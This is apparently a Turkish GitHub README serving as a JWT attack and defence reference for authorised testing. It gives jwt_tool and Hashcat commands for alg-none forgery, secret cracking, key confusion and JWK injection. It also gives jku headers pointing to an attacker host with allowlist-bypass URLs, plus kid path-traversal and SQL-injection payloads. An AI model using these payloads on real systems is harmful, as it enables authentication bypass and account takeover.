# 🎟️ JWT Saldırıları - Kapsamlı Başvuru Kılavuzu

[🇺🇸 English Version](../README.md)

```
       ██╗██╗    ██╗████████╗     █████╗ ████████╗████████╗ █████╗  ██████╗██╗  ██╗███████╗
       ██║██║    ██║╚══██╔══╝    ██╔══██╗╚══██╔══╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝██╔════╝
       ██║██║ █╗ ██║   ██║       ███████║   ██║      ██║   ███████║██║     █████═╝ ███████╗
  ██   ██║██║███╗██║   ██║       ██╔══██║   ██║      ██║   ██╔══██║██║     ██╔═██╗ ╚════██║
  ╚█████╔╝╚███╔███╔╝   ██║       ██║  ██║   ██║      ██║   ██║  ██║╚██████╗██║  ██╗███████║
   ╚════╝  ╚══╝╚══╝    ╚═╝       ╚═╝  ╚═╝   ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚══════╝
             JSON Web Token Exploitation & Security Testing Guide
```

<p align="center">
  <img src="https://img.shields.io/badge/JWT-Attacks-orange?style=for-the-badge" alt="JWT Attacks">
  <img src="https://img.shields.io/badge/jwt_tool-Automated_Testing-blue?style=for-the-badge" alt="jwt_tool">
  <img src="https://img.shields.io/badge/Algorithm_Confusion-Key_Attacks-red?style=for-the-badge" alt="Key Attacks">
  <img src="https://img.shields.io/badge/Web_Security-API_Testing-green?style=for-the-badge" alt="API Testing">
</p>

<p align="center">
  <b>🛡️ JSON Web Token (JWT) zafiyetlerini tespit etmek ve istismar etmek için kapsamlı metodoloji ve pratik komutlar</b>
</p>

---

## 📋 İçindekiler

- [Giriş ve JWT Anatomisi](#-giriş-ve-jwt-anatomisi)
- [Temel Test Araçları](#-temel-test-araçları)
- [Zafiyet Matrisi ve Saldırı Vektörleri](#-zafiyet-matrisi-ve-saldırı-vektörleri)
  - [1. None Algoritması Zafiyeti (`alg: "none"`)](#1-none-algoritması-zafiyeti-alg-none)
  - [2. Zayıf HMAC Gizli Anahtarlarını Kırma (HS256)](#2-zayıf-hmac-gizli-anahtarlarını-kırma-hs256)
  - [3. Algoritma / Anahtar Karmaşası (RS256 -> HS256)](#3-algoritma--anahtar-karmaşası-rs256---hs256)
  - [4. JWK (JSON Web Key) Başlık Enjeksiyonu](#4-jwk-json-web-key-başlık-enjeksiyonu)
  - [5. JKU (JWK Set URL) Yapılandırma Hatası ve SSRF](#5-jku-jwk-set-url-yapılandırma-hatası-ve-ssrf)
  - [6. KID (Key ID) Başlık Manipülasyonu ve Enjeksiyonlar](#6-kid-key-id-başlık-manipülasyonu-ve-enjeksiyonlar)
  - [7. Servisler Arası Yetki Aşımı ve Hassas Veri Sızıntısı](#7-servisler-arası-yetki-aşımı-ve-hassas-veri-sızıntısı)
- [`jwt_tool` ile Otomatik Testler](#-jwt_tool-ile-otomatik-testler)
- [Hashcat ile JWT Gizli Anahtarlarını Kırma](#-hashcat-ile-jwt-gizli-anahtarlarını-kırma)
- [Hızlı Referans Tablosu](#-hızlı-referans-tablosu)
- [Güvenli Yapılandırma ve Savunma](#-güvenli-yapılandırma-ve-savunma)
- [Yasal Uyarı](#-yasal-uyarı)
- [Kaynaklar](#-kaynaklar)

---

## 🎯 Giriş ve JWT Anatomisi

**JSON Web Token (JWT)**, iki taraf arasında veri transferini güvenli ve URL uyumlu şekilde gerçekleştirmek için kullanılan kompakt bir standarttır. Modern REST API'lerinde, Tek Sayfalı Uygulamalarda (SPA) ve mikroservis mimarilerinde oturum yönetimi için yaygın olarak tercih edilir.

Standart bir JWT, noktalarla (`.`) ayrılmış üç adet Base64URL kodlu bölümden oluşur:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJuYW1lIjoiQWxpY2UiLCJyb2xlIjoidXNlciJ9.4z7kE8l...
[------------- HEADER -------------].[-------------- PAYLOAD --------------].[----------- SIGNATURE -----------]
```

1. **Header (Başlık):** Belirtecin türünü ve kullanılan imzalama algoritmasını (`HS256`, `RS256`, `none` vb.) belirtir.
2. **Payload (Gövde):** Talepleri (`user_id`, `role`, geçerlilik süresi `exp` vb.) taşır. *Unutmayın: Gövde şifreli değildir, yalnızca Base64URL ile kodlanmıştır!*
3. **Signature (İmza):** Başlık ve Gövde bölümlerinin bir gizli anahtar veya özel anahtar kullanılarak hash'lenmesiyle oluşturulur.

---

## 🛠️ Temel Test Araçları

1. **jwt_tool:** Komut satırından JWT analizi, manipülasyonu ve zafiyet taraması yapan en popüler araç.
2. **Hashcat:** GPU gücüyle HMAC gizli anahtarlarını kırma (Mod `16500`).
3. **Burp Suite Eklentisi:** "JWT Editor" (PortSwigger BApp Store üzerinden kurulabilir).

### `jwt_tool` Kurulumu

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
alias jwt_tool='python3 /opt/jwt_tool/jwt_tool.py'
```

---

## 💥 Zafiyet Matrisi ve Saldırı Vektörleri

### 1. None Algoritması Zafiyeti (`alg: "none"`)

**Mekanizma:**
Bazı JWT doğrulama kütüphaneleri, başlıkta `alg` değeri `none` olarak ayarlandığında imza doğrulamasını tamamen atlar ve belirteci geçerli kabul eder.

**İstismar:**
1. Başlığı çözüp `"alg": "HS256"` değerini `"alg": "none"` olarak değiştirin.
2. Gövdedeki yetki değerini düzenleyin (örn: `"role": "admin"`).
3. İmza bölümünü silin (ancak sondaki noktayı koruyun!).

```bash
# jwt_tool ile 'none' algoritması saldırısı düzenleme
python3 jwt_tool.py <TOKEN> -X a

# Farklı büyük/küçük harf kombinasyonlarını deneme (none, None, NONE, nOnE)
python3 jwt_tool.py <TOKEN> -T -S none
```

*Oluşan Belirteç Yapısı:*
```text
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0.
```

---

### 2. Zayıf HMAC Gizli Anahtarlarını Kırma (HS256)

**Mekanizma:**
Sunucu belirteçleri simetrik algoritmalarla (`HS256`, `HS384`, `HS512`) imzalarken tahmin edilebilir ya da zayıf bir parola (örn: `secret`, `admin123`, şirket adı) kullanmışsa, saldırgan çevrimdışı parola listeleriyle bu anahtarı kırabilir ve sahte belirteçler üretebilir.

**Hashcat ile Kırma:**
```bash
# Belirteci bir dosyaya kaydedin
echo "eyJhbGciOi..." > jwt.txt

# Hashcat Mod 16500 (JWT Secret) ile kırın
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt
```

**Kırılan Parolayla Sahte Token Üretme:**
```bash
python3 jwt_tool.py <TOKEN> -T -S hs256 -p 'bulunan_gizli_anahtar'
```

---

### 3. Algoritma / Anahtar Karmaşası (RS256 -> HS256)

**Mekanizma:**
- **RS256 (Asimetrik):** Sunucunun özel anahtarıyla imzalanır; sunucunun **açık anahtarıyla (public key)** doğrulanır.
- **HS256 (Simetrik):** **Aynı paylaşılan gizli anahtar** ile hem imzalanır hem doğrulanır.

Uygulama arka planda gelen algoritma türünü katı biçimde zorlamıyorsa:
1. Sunucunun açık anahtarı temin edilir (çoğu zaman `/.well-known/jwks.json` veya TLS sertifikalarında herkese açıktır).
2. Belirtecin başlığındaki algoritma `RS256`'dan `HS256`'ya çevrilir.
3. Düzenlenen belirteç, HMAC gizli anahtarı olarak sunucunun **açık anahtarı** ile imzalanır!
4. Sunucu belirteci aldığında `HS256` görür ve elindeki doğrulama anahtarıyla (yani açık anahtarla) HMAC doğrulaması yapar; sonuç geçerli kabul edilir!

**`jwt_tool` ile İstismar:**
```bash
# Sunucunun açık anahtarını vererek algoritma karmaşası saldırısı yapın
python3 jwt_tool.py <TOKEN> -X k -pk public.pem
```

---

### 4. JWK (JSON Web Key) Başlık Enjeksiyonu

**Mekanizma:**
JWT standardı, `jwk` başlık parametresi üzerinden doğrudan açık anahtar iletilmesine izin verir. Zafiyetli sunucular, bu anahtarın güvenilir bir makama ait olup olmadığını denetlemeden gelen anahtarla imzayı doğrular.

**İstismar:**
1. Saldırgan kendi RSA anahtar çiftini üretir.
2. Açık anahtarı `jwk` başlığına gömer.
3. Belirteci kendi özel anahtarıyla imzalar.

```bash
# jwt_tool ile kendinden imzalı JWK enjeksiyonu
python3 jwt_tool.py <TOKEN> -X i
```

---

### 5. JKU (JWK Set URL) Yapılandırma Hatası ve SSRF

**Mekanizma:**
`jku` (JWK Set URL) parametresi, sunucunun imza doğrulamak için açık anahtar setini indireceği uzak bir URL adresini belirtir.

**İstismar:**
1. Saldırgan kendi sunucusunda bir `jwks.json` dosyası yayınlar:
   ```json
   {
     "keys": [
       {
         "kty": "RSA",
         "e": "AQAB",
         "use": "sig",
         "kid": "saldirgan-anahtar",
         "n": "..."
       }
     ]
   }
   ```
2. Belirtecin başlığını kendi sunucusunu gösterecek şekilde düzenler:
   ```json
   {
     "alg": "RS256",
     "typ": "JWT",
     "jku": "http://saldirgan.com/jwks.json",
     "kid": "saldirgan-anahtar"
   }
   ```
3. Belirteci kendi özel anahtarıyla imzalar.

> **Alan Adı Beyaz Listelerini Atlatma:**
> Sunucu yalnızca belirli alan adlarına izin veriyorsa:
> - `https://guvenilir.com@saldirgan.com/jwks.json`
> - `https://guvenilir.com.saldirgan.com/jwks.json`
> - Açık yönlendirme (Open Redirect) ile: `https://guvenilir.com/redirect?url=http://saldirgan.com/jwks.json`

---

### 6. KID (Key ID) Başlık Manipülasyonu ve Enjeksiyonlar

`kid` başlığı, veritabanından veya dosya sisteminden hangi anahtarın yükleneceğini belirleyen bir kimlik dizesidir.

#### A. Dizin Geçişi (Directory Traversal) ile `/dev/null`
Sunucu anahtarı diskten okuyorsa:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "/dev/null"
}
```
Belirteci boş bir anahtarla (`""` / 0 bayt) imzalayın!

#### B. KID Üzerinden SQL Enjeksiyonu
Sunucu anahtarı veritabanından çekiyorsa:
```sql
SELECT secret FROM keys WHERE kid = 'GIRDI';
```
Kendi belirlediğiniz statik bir anahtarı enjekte edin:
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "key' UNION SELECT 'benim_gizli_anahtarim'-- -"
}
```
Belirteci `'benim_gizli_anahtarim'` anahtarıyla imzalayın.

---

### 7. Servisler Arası Yetki Aşımı ve Hassas Veri Sızıntısı

- **Açıkta Kalan Kişisel Veriler (PII):** Geliştiriciler payload'un şifrelenmediğini unutarak parolaları, kimlik numaralarını veya gizli verileri gövdeye açık metin koyabilir.
- **Servis Karmaşası:** Düşük yetkili bir mikroservis için üretilen belirtecin yönetim paneli servisinde denenmesi.

---

## ⚡ `jwt_tool` ile Otomatik Testler

### Tüm Bilinen Saldırı Senaryolarını Otomatik Taramak:

```bash
# Otomatik playbook taraması başlatın
python3 jwt_tool.py <TOKEN> -M pb -t https://target.com/api/user -rh "Authorization: Bearer <TOKEN>"
```

### Etkileşimli Değişiklik Modu:
```bash
# Başlık ve gövde değerlerini etkileşimli düzenleyin
python3 jwt_tool.py <TOKEN> -T
```

---

## 🔓 Hashcat ile JWT Gizli Anahtarlarını Kırma

```bash
# 1. Belirteci tek satır halinde dosyaya kaydedin
echo "eyJhbGciOiJIUzI1NiIsInR5..." > jwt.txt

# 2. rockyou kelime listesi ile sözlük saldırısı
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -w 3

# 3. Kural tabanlı (rule-based) saldırı
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

---

## 📊 Hızlı Referans Tablosu

| Zafiyet | Saldırı Tekniği | Örnek Komut / Yük |
|---------|-----------------|-------------------|
| **None Algoritması** | `alg: "none"` yapıp imzayı silme | `jwt_tool <TOKEN> -X a` |
| **Zayıf Gizli Anahtar** | GPU ile sözlük kırma | `hashcat -m 16500 jwt.txt rockyou.txt` |
| **Algoritma Karmaşası** | RS256'yı HS256 yapıp açık anahtarla imzalama | `jwt_tool <TOKEN> -X k -pk pub.pem` |
| **JWK Enjeksiyonu** | Başlığa saldırganın açık anahtarını gömme | `jwt_tool <TOKEN> -X i` |
| **JKU Enjeksiyonu** | `jku`'yu harici sunucuya yönlendirme | `"jku": "http://evil.com/jwks.json"` |
| **KID Dizin Geçişi** | `kid`'i `/dev/null` veya bilinen boş dosyaya yönlendirme | `"kid": "/dev/null"` (Boş string ile imzala) |
| **KID SQL Injection**| SQL sorgusuna statik anahtar enjekte etme | `"kid": "' UNION SELECT 'secret'-- -"` |

---

## 🛡️ Güvenli Yapılandırma ve Savunma

1. **Algoritmaları Açıkça Beyaz Listeye Alın:**
   İstemcinin `alg` başlığını serbestçe seçmesine izin vermeyin. Sunucu tarafında yalnızca beklenen algoritmayı (örneğin sadece `RS256`) kabul edin.
2. **`alg: none` Belirteçlerini Kesinlikle Engelleyin:**
   Kütüphanenizin imzasız belirteçleri koşulsuz reddettiğinden emin olun.
3. **Kriptografik Olarak Güçlü Anahtarlar Kullanın:**
   HMAC anahtarları en az 256 bit uzunluğunda ve güvenli rastgele sayı üreteçleri (CSPRNG) ile oluşturulmalıdır.
4. **`jku` ve `jwk` Başlıklarını Doğrulayın:**
   Yalnızca dahili güvenilir alan adlarından anahtar indirilmesine izin verin; harici URL'leri engelleyin.
5. **`kid` Değerini Temizleyin:**
   `kid` değerini güvenilmeyen kullanıcı girdisi olarak değerlendirin; SQL enjeksiyonu ve dizin geçişi (`../`) kontrollerinden geçirin.

---

## ⚠️ Yasal Uyarı

> **ÖNEMLİ:** JWT saldırıları tam kimlik doğrulama atlatmalarına ve veritabanı sızıntılarına yol açabilir. Bu rehber yalnızca yetkili güvenlik testleri ve eğitim amacıyla kullanılmalıdır.

---

## 📚 Kaynaklar

- [jwt_tool GitHub Deposu](https://github.com/ticarpi/jwt_tool)
- [PortSwigger Web Security Academy: JWT Saldırıları](https://portswigger.net/web-security/jwt)
- [RFC 7519 - JSON Web Token (JWT) Standardı](https://datatracker.ietf.org/doc/html/rfc7519)
